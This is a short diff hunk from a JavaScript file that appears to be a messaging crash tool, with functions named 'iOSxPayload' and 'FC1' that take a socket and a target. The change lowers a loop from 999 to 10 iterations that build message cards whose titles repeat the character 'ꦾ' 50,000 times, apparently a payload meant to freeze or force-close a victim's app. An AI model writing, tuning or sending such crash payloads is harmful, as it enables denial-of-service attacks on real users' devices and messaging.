@@ -965,7 +965,7 @@ async function iOSxPayload(sock, target) {
 async function FC1(sock, target) {
   const cards = [];
   
-  for (let i = 0; i < 999; i++) { 
+  for (let i = 0; i < 10; i++) { 
     cards.push({
       header: {
         title: 'ꦾ'.repeat(50000),
